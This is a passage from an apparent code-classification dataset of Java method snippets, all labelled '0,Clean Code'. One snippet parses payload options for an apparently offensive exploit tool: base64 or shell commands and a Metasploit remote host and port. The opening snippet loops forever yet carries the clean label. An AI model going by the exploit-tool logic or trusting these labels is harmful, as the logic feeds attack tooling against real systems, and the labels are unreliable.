      userLinks.addAll(this.linkRoles.stream().map(u -> {
        OaTaskUserLink link=new OaTaskUserLink();
        link.setUserLinkType(FlowConstant.USER_LINK_ROLES);
        link.setLinkId(u.getId());
        link.setLinkName(u.getName());
        return link;
      }
).collect(Collectors.toList()));
    }
    build.setUserLinks(userLinks);
  }
 else {
    if (!CollectionUtils.isEmpty(this.linkUsers)) {
      this.users.addAll(this.linkUsers);
    }
    if (!CollectionUtils.isEmpty(this.linkRoles)) {
      LinkedHashSet<OrgTreeVo> users=userLinkService.getUserIdsByRoleIds(this.linkRoles.stream().map(l -> l.getId()).toArray(String[]::new));
      this.users.addAll(users);
    }
    if (!CollectionUtils.isEmpty(this.users)) {
      int i=0;
      while (this.users.iterator().hasNext()) {
        OaTask oaTask=this.buildPrimeTask();
        oaTask.setAssignee(this.users.iterator().next().getId());
        if (this.active && i > 0) {
          oaTask.setActive(false);
        }
        tasks.add(oaTask);
      }
    }
  }
  return tasks;
}",0,Clean Code
"ErrorHandling ignoreErrors();
",0,Clean Code
"@Test public void documentUpdateTest(){
  contextRunner.run(context -> {
    VectorStore vectorStore=context.getBean(VectorStore.class);
    Document document=new Document(UUID.randomUUID().toString(),""Spring AI rocks!!"",Collections.singletonMap(""meta1"",""meta1""));
    vectorStore.add(List.of(document));
    SearchRequest springSearchRequest=SearchRequest.query(""Spring"").withTopK(5);
    Awaitility.await().until(() -> {
      return vectorStore.similaritySearch(springSearchRequest);
    }
,hasSize(1));
    List<Document> results=vectorStore.similaritySearch(springSearchRequest);
    assertThat(results).hasSize(1);
    Document resultDoc=results.get(0);
    assertThat(resultDoc.getId()).isEqualTo(document.getId());
    assertThat(resultDoc.getContent()).isEqualTo(""Spring AI rocks!!"");
    assertThat(resultDoc.getMetadata()).containsKey(""meta1"");
    assertThat(resultDoc.getMetadata()).containsKey(""distance"");
    Document sameIdDocument=new Document(document.getId(),""The World is Big and Salvation Lurks Around the Corner"",Collections.singletonMap(""meta2"",""meta2""));
    vectorStore.add(List.of(sameIdDocument));
    SearchRequest fooBarSearchRequest=SearchRequest.query(""FooBar"").withTopK(5);
    Awaitility.await().until(() -> {
      return vectorStore.similaritySearch(fooBarSearchRequest).get(0).getContent();
    }
,equalTo(""The World is Big and Salvation Lurks Around the Corner""));
    results=vectorStore.similaritySearch(fooBarSearchRequest);
    assertThat(results).hasSize(1);
    resultDoc=results.get(0);
    assertThat(resultDoc.getId()).isEqualTo(document.getId());
    assertThat(resultDoc.getContent()).isEqualTo(""The World is Big and Salvation Lurks Around the Corner"");
    assertThat(resultDoc.getMetadata()).containsKey(""meta2"");
    assertThat(resultDoc.getMetadata()).containsKey(""distance"");
    vectorStore.delete(List.of(document.getId()));
    Awaitility.await().until(() -> {
      return vectorStore.similaritySearch(fooBarSearchRequest);
    }
,hasSize(0));
  }
);
}",0,Clean Code
"Map<String,Object> queryProjectCount(Long iEmpRecordId);
",0,Clean Code
"@ExplodeLoop public Object executeGeneric(VirtualFrame frame){
  var owner=VmUtils.getOwner(frame);
  for (var i=1; i < levelsUp; i++) {
    owner=owner.getEnclosingOwner();
    assert owner != null;
  }
  var result=owner.getEnclosingOwner();
  assert result != null;
  return result;
}",0,Clean Code
"/** 
 * <pre> JGJCJHMAKKA reason = 11; </pre> <code>repeated .ChessRogueCell cell_info = 3;</code>
 * @param values the cellInfo to add
 * @return this
 */
public ChessRogueCellUpdateNotify addAllCellInfo(final ChessRogueCellOuterClass.ChessRogueCell... values){
  bitField0_|=0x00000002;
  cellInfo.addAll(values);
  return this;
}",0,Clean Code
"@Override protected int computeSerializedSize(){
  int size=0;
  if ((bitField0_ & 0x00000001) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(serverPrefsId);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(retcode);
  }
  return size;
}",0,Clean Code
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.classification.protos.ViterbiModelProto)) {
    return super.equals(obj);
  }
  org.tribuo.classification.protos.ViterbiModelProto other=(org.tribuo.classification.protos.ViterbiModelProto)obj;
  if (hasMetadata() != other.hasMetadata())   return false;
  if (hasMetadata()) {
    if (!getMetadata().equals(other.getMetadata()))     return false;
  }
  if (hasModel() != other.hasModel())   return false;
  if (hasModel()) {
    if (!getModel().equals(other.getModel()))     return false;
  }
  if (hasLabelFeatureExtractor() != other.hasLabelFeatureExtractor())   return false;
  if (hasLabelFeatureExtractor()) {
    if (!getLabelFeatureExtractor().equals(other.getLabelFeatureExtractor()))     return false;
  }
  if (getStackSize() != other.getStackSize())   return false;
  if (!getScoreAggregation().equals(other.getScoreAggregation()))   return false;
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}
",0,Clean Code
"@Override public String secretAccessKey(){
  return ""CUSTOM_SECRET_ACCESS_KEY"";
}
",0,Clean Code
"public static void setGestureLine(Context context,int type){
  Settings.Global.putInt(context.getContentResolver(),""hide_gesture_line"",type);
}
",0,Clean Code
"@Override public TableMeta getTableMeta(String databaseName,String schemaName,String tableName){
  return TableMeta.builder().columnTypes(PostgreSQLColumnTypeEnum.getTypes()).charsets(PostgreSQLCharsetEnum.getCharsets()).collations(PostgreSQLCollationEnum.getCollations()).indexTypes(PostgreSQLIndexTypeEnum.getIndexTypes()).defaultValues(PostgreSQLDefaultValueEnum.getDefaultValues()).build();
}
",0,Clean Code
"/** 
 * <code>optional uint32 times = 7;</code>
 * @return whether the times field is set
 */
public boolean hasTimes(){
  return (bitField0_ & 0x00000001) != 0;
}",0,Clean Code
"@Override public RelicArchive copyFrom(final RelicArchive other){
  cachedSize=other.cachedSize;
  if ((bitField0_ | other.bitField0_) != 0) {
    bitField0_=other.bitField0_;
    relicId=other.relicId;
    slot=other.slot;
  }
  return this;
}",0,Clean Code
"@NonNull @Override public String toString(){
  StringBuilder sb=new StringBuilder(128);
  sb.append(""FragmentState{"");
  sb.append(mClassName);
  sb.append("" ("");
  sb.append(mWho);
  sb.append("")}:"");
  if (mFromLayout) {
    sb.append("" fromLayout"");
  }
  if (mContainerId != 0) {
    sb.append("" id=0x"");
    sb.append(Integer.toHexString(mContainerId));
  }
  if (mTag != null && !mTag.isEmpty()) {
    sb.append("" tag="");
    sb.append(mTag);
  }
  if (mRetainInstance) {
    sb.append("" retainInstance"");
  }
  if (mRemoving) {
    sb.append("" removing"");
  }
  if (mDetached) {
    sb.append("" detached"");
  }
  if (mHidden) {
    sb.append("" hidden"");
  }
  return sb.toString();
}",0,Clean Code
"public String getErrorMsg(){
  return this.errorMsg;
}
",0,Clean Code
"@java.lang.Override public void writeTo(com.google.protobuf.CodedOutputStream output) throws java.io.IOException {
  getSerializedSize();
  if (svmType_ != 0) {
    output.writeInt32(1,svmType_);
  }
  if (kernelType_ != 0) {
    output.writeInt32(2,kernelType_);
  }
  if (degree_ != 0) {
    output.writeInt32(3,degree_);
  }
  if (java.lang.Double.doubleToRawLongBits(gamma_) != 0) {
    output.writeDouble(4,gamma_);
  }
  if (java.lang.Double.doubleToRawLongBits(coef0_) != 0) {
    output.writeDouble(5,coef0_);
  }
  if (java.lang.Double.doubleToRawLongBits(cacheSize_) != 0) {
    output.writeDouble(6,cacheSize_);
  }
  if (java.lang.Double.doubleToRawLongBits(eps_) != 0) {
    output.writeDouble(7,eps_);
  }
  if (java.lang.Double.doubleToRawLongBits(c_) != 0) {
    output.writeDouble(8,c_);
  }
  if (nrWeight_ != 0) {
    output.writeInt32(9,nrWeight_);
  }
  if (getWeightLabelList().size() > 0) {
    output.writeUInt32NoTag(82);
    output.writeUInt32NoTag(weightLabelMemoizedSerializedSize);
  }
  for (int i=0; i < weightLabel_.size(); i++) {
    output.writeInt32NoTag(weightLabel_.getInt(i));
  }
  if (getWeightList().size() > 0) {
    output.writeUInt32NoTag(90);
    output.writeUInt32NoTag(weightMemoizedSerializedSize);
  }
  for (int i=0; i < weight_.size(); i++) {
    output.writeDoubleNoTag(weight_.getDouble(i));
  }
  if (java.lang.Double.doubleToRawLongBits(nu_) != 0) {
    output.writeDouble(12,nu_);
  }
  if (java.lang.Double.doubleToRawLongBits(p_) != 0) {
    output.writeDouble(13,p_);
  }
  if (shrinking_ != 0) {
    output.writeInt32(14,shrinking_);
  }
  if (probability_ != 0) {
    output.writeInt32(15,probability_);
  }
  unknownFields.writeTo(output);
}",0,Clean Code
"public static SQLQueryAdapter create(MySQLGlobalState globalState){
  return new MySQLAlterTable(globalState.getSchema()).create();
}
!org.eclipse.jdt.core.dom.MethodDeclaration@12f1ecd1",0,Clean Code
"@Override public boolean equals(Object o){
  if (o == this) {
    return true;
  }
  if (!(o instanceof RefreshTriggerByClientScNotify)) {
    return false;
  }
  RefreshTriggerByClientScNotify other=(RefreshTriggerByClientScNotify)o;
  return bitField0_ == other.bitField0_ && (!hasTriggerEntityId() || triggerEntityId == other.triggerEntityId) && (!hasTriggerName() || triggerName.equals(other.triggerName)) && (!hasTriggerTargetIdList() || triggerTargetIdList.equals(other.triggerTargetIdList));
}",0,Clean Code
"public MockResponse genMockResponse(String returnType,int status,String valueKeyWord,String fileId,String fileName,ApiDefinitionBlob apiDefinitionBlob){
  MockResponse mockResponse=new MockResponse();
  mockResponse.setStatusCode(status);
  if (apiDefinitionBlob != null) {
    mockResponse.setUseApiResponse(true);
    List<HttpResponse> msHttpResponseList=JSON.parseArray(new String(apiDefinitionBlob.getResponse()),HttpResponse.class);
    msHttpResponseList.forEach(item -> {
      if (!item.isDefaultFlag()) {
        mockResponse.setApiResponseId(item.getId());
      }
    }
);
  }
 else {
    ResponseBody body=new ResponseBody();
switch (returnType) {
case ""file"":
      body.setBodyType(Body.BodyType.BINARY.name());
    body.setBinaryBody(new ResponseBinaryBody(){
{
        this.setSendAsBody(false);
        this.setFile(new ApiFile());
        this.getFile().setFileId(fileId);
        this.getFile().setFileName(fileName);
      }
    }
);
  break;
case ""file-body"":
body.setBodyType(Body.BodyType.BINARY.name());
body.setBinaryBody(new ResponseBinaryBody(){
{
  this.setSendAsBody(false);
  this.setFile(new ApiFile());
  this.getFile().setFileId(fileId);
  this.getFile().setFileName(fileName);
}
}
);
break;
case ""json"":
body.setBodyType(Body.BodyType.JSON.name());
body.setJsonBody(new JsonBody(){
{
this.setJsonValue(""{\""inputAge\"":123, \""testKeyWord\"":\"""" + valueKeyWord + ""\""}"");
}
}
);
break;
case ""xml"":
body.setBodyType(Body.BodyType.XML.name());
body.setXmlBody(new XmlBody(){
{
this.setValue(""<xml>"" + valueKeyWord + ""</xml>"");
}
}
);
break;
case ""raw"":
body.setBodyType(Body.BodyType.RAW.name());
body.setRawBody(new RawBody(){
{
this.setValue(""Raw body content:"" + valueKeyWord);
}
}
);
break;
}
mockResponse.setBody(body);
}
List<MsHeader> headers=new ArrayList<>(){
{
this.add(new MsHeader(){
{
this.setKey(""rspHeaderA"");
this.setValue(""header-1"");
}
}
);
this.add(new MsHeader(){
{
this.setKey(""rspHeaderB"");
this.setValue(""header-2"");
this.setEnable(false);
}
}
);
this.add(new MsHeader(){
{
this.setKey(""rspHeaderC"");
this.setValue(""header-3"");
}
}
);
}
}
;
mockResponse.setHeaders(headers);
return mockResponse;
}",0,Clean Code
"public void CommandNavigationFunctionRedo(TextPadService textpadObject,String commandNo){
switch (commandNo) {
case ""1"":
    textpadObject.display(Lines);
  break;
case ""2"":
textpadObject.display(Lines,displaystart,displayend);
break;
case ""3"":
this.PreviousLines=(ArrayList<String>)this.Lines.clone();
System.out.println(""I text"" + insertText + insertLineNo);
textpadObject.insert(this.Lines,this.insertText,this.insertLineNo);
break;
case ""4"":
textpadObject.delete(Lines,deleteNo);
break;
case ""5"":
textpadObject.deleteInRange(Lines,deleteRangeStart,deleteRangeEnd);
break;
case ""6"":
break;
case ""7"":
textpadObject.pasteLines(Lines,copiedtext,pasteLineNo);
break;
}
}",0,Clean Code
"@Override public void init(){
  findAndHookMethod(""com.miui.mediaeditor.api.MediaEditorApiHelper"",""isMagicMattingAvailable"",new BaseHook.MethodHook(){
    @Override protected void before(    XC_MethodHook.MethodHookParam param) throws Throwable {
      param.setResult(true);
    }
  }
);
}
",0,Clean Code
"@Override public SceneActorInfo mergeFrom(final SceneActorInfo other){
  if (other.isEmpty()) {
    return this;
  }
  cachedSize=-1;
  if (other.hasMapLayer()) {
    setMapLayer(other.mapLayer);
  }
  if (other.hasBaseAvatarId()) {
    setBaseAvatarId(other.baseAvatarId);
  }
  if (other.hasUid()) {
    setUid(other.uid);
  }
  if (other.hasAvatarType()) {
    setAvatarTypeValue(other.avatarType);
  }
  return this;
}
!org.eclipse.jdt.core.dom.MethodDeclaration@333c5ec3!org.eclipse.jdt.core.dom.MethodDeclaration@22c3ba93",0,Clean Code
"public int getLine(){
  return line;
}
",0,Clean Code
"/** 
 * <code>repeated uint32 disabled_main_mission_id_list = 10;</code>
 * @param value the disabledMainMissionIdList to add
 * @return this
 */
public GetMissionStatusScRsp addDisabledMainMissionIdList(final int value){
  bitField0_|=0x00000004;
  disabledMainMissionIdList.add(value);
  return this;
}",0,Clean Code
"/** 
 * <code>optional uint32 compose_id = 13;</code>
 * @return whether the composeId field is set
 */
public boolean hasComposeId(){
  return (bitField0_ & 0x00000002) != 0;
}",0,Clean Code
"public boolean getHasGuildUserInfo(){
  return this.hasGuildUserInfo;
}
",0,Clean Code
"public final int getWindowHeight(){
  return Config.getInstance().getPreferences().getLayout().getHeight();
}
",0,Clean Code
"@SuppressWarnings({""rawtypes"",""unchecked""}) public static void setArrayListElements(ArrayList list,Object[] elements){
  if (FAST_MODE) {
    Platform.putInt(list,Offset.ARRAY_LIST_SIZE_OFFSET,elements.length);
    Platform.putObject(list,Offset.ARRAY_LIST_ARRAY_OFFSET,elements);
  }
 else {
    for (    Object element : elements) {
      list.add(element);
    }
  }
}
",0,Clean Code
"public static void setFileLogging(final boolean enable){
  rootLogger.removeHandler(fileHandler);
  if (enable) {
    rootLogger.addHandler(fileHandler);
  }
}
",0,Clean Code
"@Override public ProcessorBean build(ProcessorDefinition processorDefinition){
  try {
    boolean canLoad=checkCanLoad();
    if (!canLoad) {
      log.info(""[ProcessorFactory] can't find Spring env, this processor can't load by 'BuildInSpringMethodProcessorFactory'"");
      return null;
    }
    String processorInfo=processorDefinition.getProcessorInfo();
    if (!processorInfo.contains(DELIMITER)) {
      log.info(""[ProcessorFactory] can't parse processorDefinition, this processor can't load by 'BuildInSpringMethodProcessorFactory'"");
      return null;
    }
    String[] split=processorInfo.split(DELIMITER);
    String methodName=split[1];
    String className=split[0];
    Object bean=getBean(className,applicationContext);
    Method[] methods=bean.getClass().getDeclaredMethods();
    for (    Method method : methods) {
      PowerJobHandler powerJob=method.getAnnotation(PowerJobHandler.class);
      if (powerJob == null) {
        powerJob=AnnotationUtils.findAnnotation(method,PowerJobHandler.class);
      }
      if (powerJob == null) {
        continue;
      }
      String name=powerJob.name();
      if (!name.equals(methodName)) {
        continue;
      }
      if (name.trim().length() == 0) {
        throw new RuntimeException(""method-jobhandler name invalid, for["" + bean.getClass() + ""#""+ method.getName()+ ""] ."");
      }
      if (containsJobHandler(name)) {
        throw new RuntimeException(""jobhandler["" + name + ""] naming conflicts."");
      }
      method.setAccessible(true);
      registerJobHandler(methodName);
      MethodBasicProcessor processor=new MethodBasicProcessor(bean,method);
      return new ProcessorBean().setProcessor(processor).setClassLoader(processor.getClass().getClassLoader());
    }
  }
 catch (  NoSuchBeanDefinitionException ignore) {
    log.warn(""[ProcessorFactory] can't find the processor in SPRING"");
  }
catch (  Throwable t) {
    log.warn(""[ProcessorFactory] load by BuiltInSpringProcessorFactory failed. If you are using Spring, make sure this bean was managed by Spring"",t);
  }
  return null;
}",0,Clean Code
"public boolean isChanged(){
  if (getMatchState() != EMatchState.MATCHED) {
    if (primaryCall != null) {
      return primaryCall.isChanged();
    }
    if (secondaryCall != null) {
      return secondaryCall.isChanged();
    }
  }
  return false;
}
",0,Clean Code
"@Override public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException {
  try {
    base=base.replace('\\','/');
    int fistIndex=base.indexOf(""/"");
    int secondIndex=base.indexOf(""/"",fistIndex + 1);
    if (secondIndex < 0)     secondIndex=base.length();
    try {
      payloadType=base.substring(fistIndex + 1,secondIndex);
      System.out.println(ansi().render(""@|green [+] PaylaodType : |@"" + payloadType));
    }
 catch (    IllegalArgumentException e) {
      throw new UnSupportedPayloadTypeException(""UnSupportedPayloadType : "" + base.substring(fistIndex + 1,secondIndex));
    }
    int thirdIndex=base.indexOf(""/"",secondIndex + 1);
    if (thirdIndex != -1) {
      if (thirdIndex < 0)       thirdIndex=base.length();
      try {
        gadgetType=GadgetType.valueOf(base.substring(secondIndex + 1,thirdIndex).toLowerCase());
      }
 catch (      IllegalArgumentException e) {
        throw new UnSupportedPayloadTypeException(""UnSupportedPayloadType : "" + base.substring(secondIndex + 1,thirdIndex));
      }
    }
    if (gadgetType == GadgetType.base64) {
      String cmd=Util.getCmdFromBase(base);
      System.out.println(ansi().render(""@|green [+] Command : |@"" + cmd));
      params=new String[]{cmd};
    }
    if (gadgetType == GadgetType.shell) {
      String cmd1=Util.getCmdFromBase(base);
      byte[] decodedBytes=Util.base64Decode(cmd1);
      String cmd=new String(decodedBytes);
      String[] cmdArray=cmd.split("" "");
      System.out.println(ansi().render(""@|green [+] Command : |@"" + cmd));
      params=cmdArray;
    }
    if (gadgetType == GadgetType.msf) {
      String[] results1=Util.getIPAndPortFromBase(base);
      Config.rhost=results1[0];
      Config.rport=results1[1];
      System.out.println(""[+] RemotHost: "" + results1[0]);
      System.out.println(""[+] RemotPort: "" + results1[1]);
      params=results1;
    }
  }
 catch (  Exception e) {
    if (e instanceof UnSupportedPayloadTypeException)     throw (UnSupportedPayloadTypeException)e;
    throw new IncorrectParamsException(""Incorrect params: "" + base);
  }
}",0,Clean Code
"@Test public void testNe(){
  String vectorExpr=converter.convertExpression(new Expression(OR,new Expression(GTE,new Key(""year""),new Value(2020)),new Expression(AND,new Expression(EQ,new Key(""country""),new Value(""BG"")),new Expression(NE,new Key(""city""),new Value(""Sofia"")))));
  assertThat(vectorExpr).isEqualTo(""{$or:[{\""metadata.year\"":{$gte:2020}},{$and:[{\""metadata.country\"":{$eq:\""BG\""}},{\""metadata.city\"":{$ne:\""Sofia\""}}]}]}"");
}",0,Clean Code
"private Object readResolve(){
  Container c=new Container(this.containerLabel);
  for (int i=0; this.items != null && i < this.items.size(); i++) {
    c.addItem(this.items.get(i));
  }
  return c;
}",0,Clean Code
"static void deleteAllProximityNodes(final BinDiffGraph<?,?> graph) throws GraphLayoutException {
  final Graph2D yGraph=graph.getGraph();
  try {
    yGraph.firePreEvent();
    graph.getProximityBrowser().deleteProximityBrowsingNodes();
    for (final NodeCursor nc=yGraph.nodes(); nc.ok(); nc.next()) {
      if (yGraph.getRealizer(nc.node()) instanceof ZyProximityNodeRealizer<?>) {
        if (nc.node().getGraph() == yGraph) {
          yGraph.removeNode(nc.node());
        }
 else {
          throw new GraphLayoutException(""Delete proximity node failed. Couldn't update proximity browsing."");
        }
      }
    }
  }
  finally {
    yGraph.firePostEvent();
  }
}",0,Clean Code
"@Override public DummyRegressionModel train(Dataset<Regressor> examples,Map<String,Provenance> instanceProvenance){
  return train(examples,instanceProvenance,INCREMENT_INVOCATION_COUNT);
}
!org.eclipse.jdt.core.dom.MethodDeclaration@65bd200f",0,Clean Code
"public Boolean isDenseVectorIndexing(){
  return denseVectorIndexing;
}
",0,Clean Code
"public static void main(String[] args) throws Exception {
  String path=""application.properties"";
  Resource resource=new ClassPathResource(path);
  try (InputStream is=resource.getInputStream()){
    System.out.println(new String(is.readAllBytes()));
  }
 }
",0,Clean Code
"/** 
 * Clone the provided array, ensuring that original component type is retained.
 * @param array the array to clone
 */
private Object cloneArray(Object array){
  if (array instanceof boolean[]) {
    return ((boolean[])array).clone();
  }
  if (array instanceof byte[]) {
    return ((byte[])array).clone();
  }
  if (array instanceof char[]) {
    return ((char[])array).clone();
  }
  if (array instanceof double[]) {
    return ((double[])array).clone();
  }
  if (array instanceof float[]) {
    return ((float[])array).clone();
  }
  if (array instanceof int[]) {
    return ((int[])array).clone();
  }
  if (array instanceof long[]) {
    return ((long[])array).clone();
  }
  if (array instanceof short[]) {
    return ((short[])array).clone();
  }
  return ((Object[])array).clone();
}
",0,Clean Code
"/** 
 * Copies a file to a new location preserving the file date. <p> This method copies the contents of the specified source file to the specified destination file. The directory holding the destination file is created if it does not exist. If the destination file exists, then this method will overwrite it. <p> <strong>Note:</strong> This method tries to preserve the file's last modified date/times using  {@link File#setLastModified(long)}, however it is not guaranteed that the operation will succeed. If the modification operation fails, no indication is provided.
 * @param srcFile  an existing file to copy, must not be <code>null</code>
 * @param destFile  the new file, must not be <code>null</code>
 * @throws NullPointerException if source or destination is <code>null</code>
 * @throws IOException if source or destination is invalid
 * @throws IOException if an IO error occurs during copying
 * @see #copyFileToDirectory(File,File)
 */
public static void copyFile(File srcFile,File destFile) throws IOException {
  copyFile(srcFile,destFile,true);
}
/** 
 * Copies a file to a new location. <p> This method copies the contents of the specified source file to the specified destination file. The directory holding the destination file is created if it does not exist. If the destination file exists, then this method will overwrite it. <p> <strong>Note:</strong> Setting <code>preserveFileDate</code> to <code>true</code> tries to preserve the file's last modified date/times using  {@link File#setLastModified(long)}, however it is not guaranteed that the operation will succeed. If the modification operation fails, no indication is provided.
 * @param srcFile  an existing file to copy, must not be <code>null</code>
 * @param destFile  the new file, must not be <code>null</code>
 * @param preserveFileDate  true if the file date of the copyshould be the same as the original
 * @throws NullPointerException if source or destination is <code>null</code>
 * @throws IOException if source or destination is invalid
 * @throws IOException if an IO error occurs during copying
 * @see #copyFileToDirectory(File,File,boolean)
 */
public static void copyFile(File srcFile,File destFile,boolean preserveFileDate) throws IOException {
  if (srcFile == null) {
    throw new NullPointerException(""Source must not be null"");
  }
  if (destFile == null) {
    throw new NullPointerException(""Destination must not be null"");
  }
  if (srcFile.exists() == false) {
    throw new FileNotFoundException(""Source '"" + srcFile + ""' does not exist"");
  }
  if (srcFile.isDirectory()) {
    throw new IOException(""Source '"" + srcFile + ""' exists but is a directory"");
  }
  if (srcFile.getCanonicalPath().equals(destFile.getCanonicalPath())) {
    throw new IOException(""Source '"" + srcFile + ""' and destination '""+ destFile+ ""' are the same"");
  }
  if (destFile.getParentFile() != null && destFile.getParentFile().exists() == false) {
    if (destFile.getParentFile().mkdirs() == false) {
      throw new IOException(""Destination '"" + destFile + ""' directory cannot be created"");
    }
  }
  if (destFile.exists() && destFile.canWrite() == false) {
    throw new IOException(""Destination '"" + destFile + ""' exists but is read-only"");
  }
  doCopyFile(srcFile,destFile,preserveFileDate);
}
",0,Clean Code
"@Override public EntityMotion create(){
  return EntityMotion.newInstance();
}
",0,Clean Code
"public String toString(){
  return ""RichText{contents="" + this.contents + "",}"";
}
",0,Clean Code
"@Override public boolean hasNext(){
  return nextIndex >= 0;
}",0,Clean Code
"public DataType schemaBuilder(Column column){
  String typeName=column.typeName().toUpperCase();
  if (matches(typeName,""JSON"")) {
    return StringType;
  }
  if (matches(typeName,""POINT"")) {
    return BinaryType;
  }
  if (matches(typeName,""GEOMETRY"") || matches(typeName,""LINESTRING"") || matches(typeName,""POLYGON"")|| matches(typeName,""MULTIPOINT"")|| matches(typeName,""MULTILINESTRING"")|| matches(typeName,""MULTIPOLYGON"")|| isGeometryCollection(typeName)) {
    return BinaryType;
  }
  if (matches(typeName,""YEAR"")) {
    return IntegerType;
  }
  if (matches(typeName,""ENUM"")) {
    return StringType;
  }
  if (matches(typeName,""SET"")) {
    return StringType;
  }
  if (matches(typeName,""SMALLINT UNSIGNED"") || matches(typeName,""SMALLINT UNSIGNED ZEROFILL"") || matches(typeName,""INT2 UNSIGNED"")|| matches(typeName,""INT2 UNSIGNED ZEROFILL"")) {
    return IntegerType;
  }
  if (matches(typeName,""INT UNSIGNED"") || matches(typeName,""INT UNSIGNED ZEROFILL"") || matches(typeName,""INT4 UNSIGNED"")|| matches(typeName,""INT4 UNSIGNED ZEROFILL"")) {
    return LongType;
  }
  if (matches(typeName,""BIGINT UNSIGNED"") || matches(typeName,""BIGINT UNSIGNED ZEROFILL"") || matches(typeName,""INT8 UNSIGNED"")|| matches(typeName,""INT8 UNSIGNED ZEROFILL"")) {
switch (super.bigIntUnsignedMode) {
case LONG:
      return LongType;
case PRECISE:
    return new DecimalType(column.length(),0);
}
}
if (matches(typeName,""FLOAT"") && column.scale().isPresent() && column.length() <= 24) {
return FloatType;
}
return super.schemaBuilder(column);
}",0,Clean Code
"private MiniMaxApi miniMaxApi(String baseUrl,String commonBaseUrl,String apiKey,String commonApiKey,RestClient.Builder restClientBuilder,ResponseErrorHandler responseErrorHandler){
  String resolvedBaseUrl=StringUtils.hasText(baseUrl) ? baseUrl : commonBaseUrl;
  Assert.hasText(resolvedBaseUrl,""MiniMax base URL must be set"");
  String resolvedApiKey=StringUtils.hasText(apiKey) ? apiKey : commonApiKey;
  Assert.hasText(resolvedApiKey,""MiniMax API key must be set"");
  return new MiniMaxApi(resolvedBaseUrl,resolvedApiKey,restClientBuilder,responseErrorHandler);
}
",0,Clean Code
"@Override public boolean equals(Object obj){
  if (this == obj)   return true;
  if (obj == null)   return false;
  if (getClass() != obj.getClass())   return false;
  Order other=(Order)obj;
  if (name == null) {
    if (other.name != null)     return false;
  }
 else   if (!name.equals(other.name))   return false;
  if (type == null) {
    if (other.type != null)     return false;
  }
 else   if (!type.equals(other.type))   return false;
  return true;
}
",0,Clean Code
"protected Optional<List<String>> getParameterNames(Constructor<?> constructor){
  var paramNames=new ArrayList<String>(constructor.getParameterCount());
  var properties=getAnnotation(constructor,ConstructorProperties.class);
  if (properties != null) {
    return Optional.of(Arrays.asList(properties.value()));
  }
  for (  Parameter parameter : constructor.getParameters()) {
    var name=getParameterName(parameter);
    if (name == null)     return Optional.empty();
    paramNames.add(name);
  }
  return Optional.of(paramNames);
}
",0,Clean Code
"/** 
 * <code>repeated .RogueMiracle miracle_list = 14;</code>
 * @param values the miracleList to add
 * @return this
 */
public RogueAchivedMiracleInfo addAllMiracleList(final RogueMiracleOuterClass.RogueMiracle... values){
  bitField0_|=0x00000004;
  miracleList.addAll(values);
  return this;
}",0,Clean Code
"@Test public void testGetLocationFixedPath(){
  when(properties.getConnectionString()).thenReturn(azuriteConnectionString);
  AzureBlobPayloadStorage azureBlobPayloadStorage=new AzureBlobPayloadStorage(idGenerator,properties);
  String path=""somewhere"";
  ExternalStorageLocation externalStorageLocation=azureBlobPayloadStorage.getLocation(ExternalPayloadStorage.Operation.READ,ExternalPayloadStorage.PayloadType.WORKFLOW_INPUT,path);
  assertNotNull(externalStorageLocation);
  assertEquals(path,externalStorageLocation.getPath());
  assertNotNull(externalStorageLocation.getUri());
}
",0,Clean Code
"/** 
 * Convenience method for accessing the workflow definition version.
 * @return the workflow definition version.
 */
public int getWorkflowVersion(){
  Utils.checkNotNull(workflowDefinition,""Workflow definition is null"");
  return workflowDefinition.getVersion();
}
",0,Clean Code
"/** 
 * <code>optional string trigger_name = 4;</code>
 * @param value the triggerName to set
 * @return this
 */
public RefreshTriggerByClientScNotify setTriggerName(final CharSequence value){
  bitField0_|=0x00000002;
  triggerName.copyFrom(value);
  return this;
}
/** 
 * <code>optional string trigger_name = 4;</code>
 * @param value the triggerName to set
 * @return this
 */
public RefreshTriggerByClientScNotify setTriggerName(final Utf8String value){
  bitField0_|=0x00000002;
  triggerName.copyFrom(value);
  return this;
}",0,Clean Code
"@Override public void onScrollStateChanged(RecyclerView recyclerView,int newState){
switch (newState) {
case RecyclerView.SCROLL_STATE_DRAGGING:
    hideControl();
  break;
case RecyclerView.SCROLL_STATE_IDLE:
case RecyclerView.SCROLL_STATE_SETTLING:
if (mLoadPrev) {
  int item=mLayoutManager.findFirstVisibleItemPosition();
  if (item == 0) {
    mPresenter.loadPrev();
  }
}
if (mLoadNext) {
int item=mLayoutManager.findLastVisibleItemPosition();
if (item == mReaderAdapter.getItemCount() - 1) {
  mPresenter.loadNext();
}
}
break;
}
}",0,Clean Code
"private void initPrimaryKey(Table newTable){
  if (newTable == null) {
    return;
  }
  List<TableColumn> columns=newTable.getColumnList();
  if (CollectionUtils.isEmpty(columns)) {
    return;
  }
  for (  TableColumn column : columns) {
    if (column.getPrimaryKey() != null && column.getPrimaryKey()) {
      addPrimaryKey(newTable,column,EditStatus.ADD.name());
    }
  }
}
",0,Clean Code
"@java.lang.Override public int getSerializedSize(){
  int size=memoizedSize;
  if (size != -1)   return size;
  size=0;
  if (metadata_ != null) {
    size+=com.google.protobuf.CodedOutputStream.computeMessageSize(1,getMetadata());
  }
  if (!modelDef_.isEmpty()) {
    size+=com.google.protobuf.CodedOutputStream.computeBytesSize(2,modelDef_);
  }
  if (!com.google.protobuf.GeneratedMessageV3.isStringEmpty(checkpointDirectory_)) {
    size+=com.google.protobuf.GeneratedMessageV3.computeStringSize(3,checkpointDirectory_);
  }
  if (!com.google.protobuf.GeneratedMessageV3.isStringEmpty(checkpointName_)) {
    size+=com.google.protobuf.GeneratedMessageV3.computeStringSize(4,checkpointName_);
  }
  if (featureConverter_ != null) {
    size+=com.google.protobuf.CodedOutputStream.computeMessageSize(5,getFeatureConverter());
  }
  if (outputConverter_ != null) {
    size+=com.google.protobuf.CodedOutputStream.computeMessageSize(6,getOutputConverter());
  }
  if (batchSize_ != 0) {
    size+=com.google.protobuf.CodedOutputStream.computeInt32Size(7,batchSize_);
  }
  if (!com.google.protobuf.GeneratedMessageV3.isStringEmpty(outputName_)) {
    size+=com.google.protobuf.GeneratedMessageV3.computeStringSize(8,outputName_);
  }
